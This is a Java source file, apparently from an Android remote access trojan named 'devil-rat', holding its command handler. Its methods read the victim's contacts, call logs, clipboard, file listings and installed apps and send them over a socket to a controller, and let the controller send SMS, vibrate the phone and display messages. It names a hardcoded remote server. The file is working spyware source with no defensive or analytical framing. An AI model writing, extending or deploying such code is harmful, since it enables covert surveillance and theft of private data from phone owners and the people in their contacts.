package com.devil.rat;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Environment;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.widget.Toast;
import org.json.JSONObject;
import java.io.File;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;
import io.socket.client.Socket;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;

public class CommandHandler {

    private static final String SERVER_URL = "https://devil-rat-production.up.railway.app";
    private final Context ctx;

    public CommandHandler(Context ctx) {
        this.ctx = ctx;
    }

    public void getContacts(Socket socket) {
        new Thread(() -> {
            try {
                List<String> contacts = new ArrayList<>();
                Cursor cursor = ctx.getContentResolver().query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null, null, null, null);
                if (cursor != null) {
                    while (cursor.moveToNext()) {
                        String name = cursor.getString(cursor.getColumnIndexOrThrow(
                                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                        String number = cursor.getString(cursor.getColumnIndexOrThrow(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));
                        contacts.add(name + " : " + number);
                    }
                    cursor.close();
                }
                socket.emit("message", "Contacts (" + contacts.size() + "):\n" + String.join("\n", contacts));
            } catch (Exception e) {
                socket.emit("message", "Contacts error: " + e.getMessage());
            }
        }).start();
    }

    public void getCallLogs(Socket socket) {
        new Thread(() -> {
            try {
                List<String> calls = new ArrayList<>();
                Cursor cursor = ctx.getContentResolver().query(
                        CallLog.Calls.CONTENT_URI, null, null, null,
                        CallLog.Calls.DATE + " DESC");
                if (cursor != null) {
                    while (cursor.moveToNext()) {
                        String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                        String type = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                        calls.add(number + " | type=" + type);
                    }
                    cursor.close();
                }
                socket.emit("message", "Calls (" + calls.size() + "):\n" + String.join("\n", calls));
            } catch (Exception e) {
                socket.emit("message", "Calls error: " + e.getMessage());
            }
        }).start();
    }

    public void listFiles(Socket socket) {
        new Thread(() -> {
            try {
                File dir = Environment.getExternalStorageDirectory();
                StringBuilder sb = new StringBuilder();
                File[] files = dir.listFiles();
                if (files != null) {
                    for (File f : files) {
                        sb.append(f.getName()).append(f.isDirectory() ? "/" : "").append("\n");
                    }
                }
                socket.emit("message", "Files:\n" + sb.toString());
            } catch (Exception e) {
                socket.emit("message", "Files error: " + e.getMessage());
            }
        }).start();
    }

    public void getClipboard(Socket socket) {
        try {
            ClipboardManager cm = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
            if (cm != null && cm.hasPrimaryClip()) {
                ClipData clip = cm.getPrimaryClip();
                if (clip != null && clip.getItemCount() > 0) {
                    socket.emit("message", "Clipboard: " + clip.getItemAt(0).getText());
                    return;
                }
            }
            socket.emit("message", "Clipboard: empty");
        } catch (Exception e) {
            socket.emit("message", "Clipboard error");
        }
    }

    public void listApps(Socket socket) {
        new Thread(() -> {
            try {
                PackageManager pm = ctx.getPackageManager();
                List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
                StringBuilder sb = new StringBuilder();
                for (ApplicationInfo app : apps) {
                    sb.append(pm.getApplicationLabel(app)).append("\n");
                }
                socket.emit("message", "Apps (" + apps.size() + "):\n" + sb.toString());
            } catch (Exception e) {
                socket.emit("message", "Apps error");
            }
        }).start();
    }

    public void vibrate(Socket socket, String durationStr) {
        try {
            long duration = 1000;
            if (durationStr != null && !durationStr.isEmpty()) {
                duration = Long.parseLong(durationStr) * 1000L;
            }
            Vibrator v = (Vibrator) ctx.getSystemService(Context.VIBRATOR_SERVICE);
            if (v != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    v.vibrate(VibrationEffect.createOneShot(duration, VibrationEffect.DEFAULT_AMPLITUDE));
                } else {
                    v.vibrate(duration);
                }
            }
            socket.emit("message", "Vibrated");
        } catch (Exception e) {
            socket.emit("message", "Vibrate error");
        }
    }

    public void sendSms(Socket socket, String text, String number) {
        try {
            if (number == null || number.isEmpty()) {
                socket.emit("message", "SMS error: number missing");
                return;
            }
            SmsManager sm = SmsManager.getDefault();
            sm.sendTextMessage(number, null, text != null ? text : "", null, null);
            socket.emit("message", "SMS sent to " + number);
        } catch (Exception e) {
            socket.emit("message", "SMS error");
        }
    }

    public void showToast(Socket socket, String text) {
        new android.os.Handler(ctx.getMainLooper()).post(() ->
                Toast.makeText(ctx, text != null ? text : "Toast", Toast.LENGTH_LONG).show());
        socket.emit("message", "Toast: " + text);
    }
          }
